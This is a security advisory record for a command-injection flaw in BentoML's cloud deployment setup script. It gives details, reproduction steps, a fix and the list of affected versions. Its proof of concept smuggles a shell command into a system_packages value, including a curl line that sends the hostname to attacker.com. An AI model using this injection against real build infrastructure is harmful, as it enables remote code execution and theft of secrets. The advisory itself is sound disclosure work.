@@ -1,0 +1,374 @@
+advisory_id: GHSA-fgv4-6jr3-jgfw
+datasource_id: github_osv/GHSA-fgv4-6jr3-jgfw
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-fgv4-6jr3-jgfw/GHSA-fgv4-6jr3-jgfw.json
+aliases:
+  - CVE-2026-35043
+summary: |
+  BentoML: Command Injection in cloud deployment setup script
+  Commit ce53491 (March 24) fixed command injection via `system_packages` in Dockerfile templates and `images.py` by adding `shlex.quote`. However, the cloud deployment path in `src/bentoml/_internal/cloud/deployment.py` was not included in the fix. Line 1648 interpolates `system_packages` directly into a shell command using an f-string without any quoting.
+
+  The generated script is uploaded to BentoCloud as `setup.sh` and executed on the cloud build infrastructure during deployment, making this a remote code execution on the CI/CD tier.
+
+  ## Details
+
+  **Fixed paths (commit ce53491):**
+  - `src/_bentoml_sdk/images.py:88` - added `shlex.quote(package)`
+  - `src/bentoml/_internal/bento/build_config.py:505` - added `bash_quote` Jinja2 filter
+  - Jinja2 templates: `base_debian.j2`, `base_alpine.j2`, etc.
+
+  **Unfixed path:**
+
+  `src/bentoml/_internal/cloud/deployment.py`, line 1648:
+
+      def _build_setup_script(bento_dir: str, image: Image | None) -> bytes:
+          content = b""
+          config = BentoBuildConfig.from_bento_dir(bento_dir)
+          if config.docker.system_packages:
+              content += f"apt-get update && apt-get install -y {' '.join(config.docker.system_packages)} || exit 1\n".encode()
+
+  `system_packages` values from `bentofile.yaml` are joined with spaces and interpolated directly into the `apt-get install` command. No `shlex.quote`.
+
+  **Remote execution confirmed:**
+  - Line 905: `setup_script = _build_setup_script(bento_dir, svc.image)` in `_init_deployment_files`
+  - Line 908: `upload_files.append(("setup.sh", setup_script))` uploads to BentoCloud
+  - Line 914: `self.upload_files(upload_files, ...)` sends to the remote deployment
+  - The script runs on the cloud build infrastructure during container setup
+
+  **Second caller at line 1068:** `_build_setup_script` is also called during `Deployment.watch()` for dev mode hot-reload deployments.
+
+  ## Proof of Concept
+
+  bentofile.yaml:
+
+      service: "service:svc"
+      docker:
+        system_packages:
+          - "curl"
+          - "jq;curl${IFS}http://attacker.com/rce?d=$(cat${IFS}/etc/hostname)${IFS}#"
+
+  Generated setup.sh:
+
+      apt-get update && apt-get install -y curl jq;curl${IFS}http://attacker.com/rce?d=$(cat${IFS}/etc/hostname)${IFS}# || exit 1
+
+  The semicolon terminates the `apt-get` command. `${IFS}` is used for spaces (works in bash, avoids YAML parsing issues). The `#` comments out the trailing `|| exit 1`. The injected `curl` exfiltrates the hostname of the build infrastructure to the attacker.
+
+  ## Impact
+
+  A malicious `bentofile.yaml` achieves remote code execution on BentoCloud's build infrastructure (or enterprise Yatai/Kubernetes build nodes) during deployment. Attack scenarios:
+
+  1. **Supply chain:** A shared Bento from a public model hub contains a poisoned `bentofile.yaml`. When deployed to BentoCloud, the injected command runs on the build infrastructure.
+  2. **Insider threat:** A data scientist with deploy permissions injects commands into `system_packages` to exfiltrate secrets from the build environment (cloud credentials, API keys, other tenants' data).
+  3. **CI/CD compromise:** The build infrastructure typically has access to container registries, artifact storage, and deployment APIs, making this a pivot point for broader infrastructure compromise.
+
+  ## Local Reproduction Steps
+
+  Tested and confirmed on Ubuntu with BentoML source at commit 0772581.
+
+  Step 1: Create a directory with a malicious bentofile.yaml:
+
+      mkdir /tmp/bento-pwn
+      cat > /tmp/bento-pwn/bentofile.yaml << 'EOF'
+      service: "service:svc"
+      docker:
+        system_packages:
+          - "curl"
+          - "jq; touch /tmp/PWNED_BY_INJECTION #"
+      EOF
+
+  Step 2: Generate the setup script using the vulnerable code path (extracted from deployment.py:1648):
+
+      python3 -c "
+      import yaml
+      with open('/tmp/bento-pwn/bentofile.yaml') as f:
+          config = yaml.safe_load(f)
+      pkgs = config['docker']['system_packages']
+      script = f\"apt-get update && apt-get install -y {' '.join(pkgs)} || exit 1\n\"
+      print('Generated setup.sh:')
+      print(script)
+      with open('/tmp/bento-pwn/setup.sh', 'w') as f:
+          f.write(script)
+      "
+
+  Step 3: Execute and verify:
+
+      rm -f /tmp/PWNED_BY_INJECTION
+      bash /tmp/bento-pwn/setup.sh
+      ls -la /tmp/PWNED_BY_INJECTION
+
+  Result: `/tmp/PWNED_BY_INJECTION` is created, confirming the injected `touch` command executed. The semicolon broke out of `apt-get install`, the injected command ran, and `#` commented out the error handler.
+
+  Generated setup.sh content:
+
+      apt-get update && apt-get install -y curl jq; touch /tmp/PWNED_BY_INJECTION # || exit 1
+
+  For comparison, the fixed version (with shlex.quote) would generate:
+
+      apt-get update && apt-get install -y curl 'jq; touch /tmp/PWNED_BY_INJECTION #' || exit 1
+
+  The single quotes from shlex.quote neutralize the semicolon and hash, treating the entire string as a literal package name argument to apt-get.
+
+  ## Suggested Fix
+
+  Apply `shlex.quote` to each package name, matching the fix in `images.py`:
+
+      if config.docker.system_packages:
+          quoted = ' '.join(shlex.quote(p) for p in config.docker.system_packages)
+          content += f"apt-get update && apt-get install -y {quoted} || exit 1\n".encode()
+
+  — Koda Reef
+impacted_packages:
+  - purl: pkg:pypi/bentoml
+    affected_versions: vers:pypi/<=1.4.37
+    fixed_versions: vers:pypi/1.4.38
+    affected_packages:
+      - pkg:pypi/bentoml@0.0.1
+      - pkg:pypi/bentoml@0.0.2
+      - pkg:pypi/bentoml@0.0.3
+      - pkg:pypi/bentoml@0.0.5
+      - pkg:pypi/bentoml@0.0.6a0
+      - pkg:pypi/bentoml@0.0.7.dev0
+      - pkg:pypi/bentoml@0.0.7
+      - pkg:pypi/bentoml@0.0.8
+      - pkg:pypi/bentoml@0.0.8.post1
+      - pkg:pypi/bentoml@0.0.9
+      - pkg:pypi/bentoml@0.1.1
+      - pkg:pypi/bentoml@0.1.2
+      - pkg:pypi/bentoml@0.2.0
+      - pkg:pypi/bentoml@0.2.1
+      - pkg:pypi/bentoml@0.2.2
+      - pkg:pypi/bentoml@0.3.0
+      - pkg:pypi/bentoml@0.3.1
+      - pkg:pypi/bentoml@0.3.3
+      - pkg:pypi/bentoml@0.3.4
+      - pkg:pypi/bentoml@0.4.0
+      - pkg:pypi/bentoml@0.4.1
+      - pkg:pypi/bentoml@0.4.2
+      - pkg:pypi/bentoml@0.4.3
+      - pkg:pypi/bentoml@0.4.4
+      - pkg:pypi/bentoml@0.4.5
+      - pkg:pypi/bentoml@0.4.7
+      - pkg:pypi/bentoml@0.4.8
+      - pkg:pypi/bentoml@0.4.9
+      - pkg:pypi/bentoml@0.5.0
+      - pkg:pypi/bentoml@0.5.1
+      - pkg:pypi/bentoml@0.5.2
+      - pkg:pypi/bentoml@0.5.3
+      - pkg:pypi/bentoml@0.5.4
+      - pkg:pypi/bentoml@0.5.5
+      - pkg:pypi/bentoml@0.5.6
+      - pkg:pypi/bentoml@0.5.7
+      - pkg:pypi/bentoml@0.5.8
+      - pkg:pypi/bentoml@0.6.0
+      - pkg:pypi/bentoml@0.6.1
+      - pkg:pypi/bentoml@0.6.2
+      - pkg:pypi/bentoml@0.6.3
+      - pkg:pypi/bentoml@0.7.0
+      - pkg:pypi/bentoml@0.7.1
+      - pkg:pypi/bentoml@0.7.2
+      - pkg:pypi/bentoml@0.7.3
+      - pkg:pypi/bentoml@0.7.4
+      - pkg:pypi/bentoml@0.7.5
+      - pkg:pypi/bentoml@0.7.6
+      - pkg:pypi/bentoml@0.7.7
+      - pkg:pypi/bentoml@0.7.8
+      - pkg:pypi/bentoml@0.8.0
+      - pkg:pypi/bentoml@0.8.1
+      - pkg:pypi/bentoml@0.8.2
+      - pkg:pypi/bentoml@0.8.3
+      - pkg:pypi/bentoml@0.8.4
+      - pkg:pypi/bentoml@0.8.5
+      - pkg:pypi/bentoml@0.8.6
+      - pkg:pypi/bentoml@0.9.0rc0
+      - pkg:pypi/bentoml@0.9.0
+      - pkg:pypi/bentoml@0.9.1
+      - pkg:pypi/bentoml@0.9.2
+      - pkg:pypi/bentoml@0.10.0
+      - pkg:pypi/bentoml@0.10.1
+      - pkg:pypi/bentoml@0.11.dev0
+      - pkg:pypi/bentoml@0.11.0
+      - pkg:pypi/bentoml@0.12.0
+      - pkg:pypi/bentoml@0.12.1
+      - pkg:pypi/bentoml@0.13.0
+      - pkg:pypi/bentoml@0.13.1
+      - pkg:pypi/bentoml@0.13.2
+      - pkg:pypi/bentoml@1.0.0.dev0
+      - pkg:pypi/bentoml@1.0.0.dev1
+      - pkg:pypi/bentoml@1.0.0a1
+      - pkg:pypi/bentoml@1.0.0a2
+      - pkg:pypi/bentoml@1.0.0a3
+      - pkg:pypi/bentoml@1.0.0a4
+      - pkg:pypi/bentoml@1.0.0a5
+      - pkg:pypi/bentoml@1.0.0a6
+      - pkg:pypi/bentoml@1.0.0a7
+      - pkg:pypi/bentoml@1.0.0rc0
+      - pkg:pypi/bentoml@1.0.0rc1
+      - pkg:pypi/bentoml@1.0.0rc2
+      - pkg:pypi/bentoml@1.0.0rc3
+      - pkg:pypi/bentoml@1.0.0
+      - pkg:pypi/bentoml@1.0.2
+      - pkg:pypi/bentoml@1.0.3
+      - pkg:pypi/bentoml@1.0.4
+      - pkg:pypi/bentoml@1.0.5
+      - pkg:pypi/bentoml@1.0.6
+      - pkg:pypi/bentoml@1.0.7
+      - pkg:pypi/bentoml@1.0.8
+      - pkg:pypi/bentoml@1.0.9
+      - pkg:pypi/bentoml@1.0.10
+      - pkg:pypi/bentoml@1.0.11
+      - pkg:pypi/bentoml@1.0.12
+      - pkg:pypi/bentoml@1.0.13
+      - pkg:pypi/bentoml@1.0.14
+      - pkg:pypi/bentoml@1.0.15
+      - pkg:pypi/bentoml@1.0.16
+      - pkg:pypi/bentoml@1.0.17
+      - pkg:pypi/bentoml@1.0.18
+      - pkg:pypi/bentoml@1.0.19
+      - pkg:pypi/bentoml@1.0.20
+      - pkg:pypi/bentoml@1.0.21
+      - pkg:pypi/bentoml@1.0.22
+      - pkg:pypi/bentoml@1.0.23
+      - pkg:pypi/bentoml@1.0.24
+      - pkg:pypi/bentoml@1.0.25
+      - pkg:pypi/bentoml@1.1.0
+      - pkg:pypi/bentoml@1.1.1
+      - pkg:pypi/bentoml@1.1.2
+      - pkg:pypi/bentoml@1.1.3
+      - pkg:pypi/bentoml@1.1.4
+      - pkg:pypi/bentoml@1.1.5
+      - pkg:pypi/bentoml@1.1.6
+      - pkg:pypi/bentoml@1.1.7
+      - pkg:pypi/bentoml@1.1.8
+      - pkg:pypi/bentoml@1.1.9
+      - pkg:pypi/bentoml@1.1.10
+      - pkg:pypi/bentoml@1.1.11
+      - pkg:pypi/bentoml@1.2.0a0
+      - pkg:pypi/bentoml@1.2.0a1
+      - pkg:pypi/bentoml@1.2.0a2
+      - pkg:pypi/bentoml@1.2.0a3
+      - pkg:pypi/bentoml@1.2.0a4
+      - pkg:pypi/bentoml@1.2.0a5
+      - pkg:pypi/bentoml@1.2.0a6
+      - pkg:pypi/bentoml@1.2.0a7
+      - pkg:pypi/bentoml@1.2.0rc1
+      - pkg:pypi/bentoml@1.2.0
+      - pkg:pypi/bentoml@1.2.1a1
+      - pkg:pypi/bentoml@1.2.1
+      - pkg:pypi/bentoml@1.2.2
+      - pkg:pypi/bentoml@1.2.3
+      - pkg:pypi/bentoml@1.2.4
+      - pkg:pypi/bentoml@1.2.5
+      - pkg:pypi/bentoml@1.2.6
+      - pkg:pypi/bentoml@1.2.7
+      - pkg:pypi/bentoml@1.2.8
+      - pkg:pypi/bentoml@1.2.9
+      - pkg:pypi/bentoml@1.2.10
+      - pkg:pypi/bentoml@1.2.11
+      - pkg:pypi/bentoml@1.2.12
+      - pkg:pypi/bentoml@1.2.13
+      - pkg:pypi/bentoml@1.2.14
+      - pkg:pypi/bentoml@1.2.15
+      - pkg:pypi/bentoml@1.2.16
+      - pkg:pypi/bentoml@1.2.17
+      - pkg:pypi/bentoml@1.2.18
+      - pkg:pypi/bentoml@1.2.19
+      - pkg:pypi/bentoml@1.2.20
+      - pkg:pypi/bentoml@1.3.0a1
+      - pkg:pypi/bentoml@1.3.0a2
+      - pkg:pypi/bentoml@1.3.0a3
+      - pkg:pypi/bentoml@1.3.0
+      - pkg:pypi/bentoml@1.3.1
+      - pkg:pypi/bentoml@1.3.2
+      - pkg:pypi/bentoml@1.3.3
+      - pkg:pypi/bentoml@1.3.4.post1
+      - pkg:pypi/bentoml@1.3.5
+      - pkg:pypi/bentoml@1.3.6
+      - pkg:pypi/bentoml@1.3.7
+      - pkg:pypi/bentoml@1.3.8
+      - pkg:pypi/bentoml@1.3.9
+      - pkg:pypi/bentoml@1.3.10
+      - pkg:pypi/bentoml@1.3.11
+      - pkg:pypi/bentoml@1.3.12
+      - pkg:pypi/bentoml@1.3.13
+      - pkg:pypi/bentoml@1.3.14
+      - pkg:pypi/bentoml@1.3.15
+      - pkg:pypi/bentoml@1.3.16
+      - pkg:pypi/bentoml@1.3.17
+      - pkg:pypi/bentoml@1.3.18
+      - pkg:pypi/bentoml@1.3.19
+      - pkg:pypi/bentoml@1.3.20
+      - pkg:pypi/bentoml@1.3.21
+      - pkg:pypi/bentoml@1.3.22
+      - pkg:pypi/bentoml@1.4.0a1
+      - pkg:pypi/bentoml@1.4.0a2
+      - pkg:pypi/bentoml@1.4.0
+      - pkg:pypi/bentoml@1.4.1
+      - pkg:pypi/bentoml@1.4.2
+      - pkg:pypi/bentoml@1.4.3
+      - pkg:pypi/bentoml@1.4.4
+      - pkg:pypi/bentoml@1.4.5
+      - pkg:pypi/bentoml@1.4.6
+      - pkg:pypi/bentoml@1.4.7
+      - pkg:pypi/bentoml@1.4.8
+      - pkg:pypi/bentoml@1.4.9
+      - pkg:pypi/bentoml@1.4.10
+      - pkg:pypi/bentoml@1.4.11
+      - pkg:pypi/bentoml@1.4.12
+      - pkg:pypi/bentoml@1.4.13
+      - pkg:pypi/bentoml@1.4.14
+      - pkg:pypi/bentoml@1.4.15
+      - pkg:pypi/bentoml@1.4.16
+      - pkg:pypi/bentoml@1.4.17
+      - pkg:pypi/bentoml@1.4.18
+      - pkg:pypi/bentoml@1.4.19
+      - pkg:pypi/bentoml@1.4.20
+      - pkg:pypi/bentoml@1.4.21
+      - pkg:pypi/bentoml@1.4.22
+      - pkg:pypi/bentoml@1.4.23
+      - pkg:pypi/bentoml@1.4.24
+      - pkg:pypi/bentoml@1.4.25
+      - pkg:pypi/bentoml@1.4.26
+      - pkg:pypi/bentoml@1.4.27
+      - pkg:pypi/bentoml@1.4.28
+      - pkg:pypi/bentoml@1.4.29
+      - pkg:pypi/bentoml@1.4.30
+      - pkg:pypi/bentoml@1.4.31
+      - pkg:pypi/bentoml@1.4.32
+      - pkg:pypi/bentoml@1.4.33
+      - pkg:pypi/bentoml@1.4.34
+      - pkg:pypi/bentoml@1.4.35
+      - pkg:pypi/bentoml@1.4.36
+      - pkg:pypi/bentoml@1.4.37
+    fixed_packages:
+      - pkg:pypi/bentoml@1.4.38
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-fgv4-6jr3-jgfw/GHSA-fgv4-6jr3-jgfw.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-78
+references:
+  - url: https://github.com/bentoml/BentoML
+    reference_type:
+    reference_id:
+  - url: https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2026-158.yaml
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33744
+    reference_type:
+    reference_id: CVE-2026-33744
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-35043
+    reference_type:
+    reference_id: CVE-2026-35043
+  - url: https://github.com/bentoml/BentoML/security/advisories/GHSA-fgv4-6jr3-jgfw
+    reference_type:
+    reference_id: GHSA-fgv4-6jr3-jgfw
+exploits: []
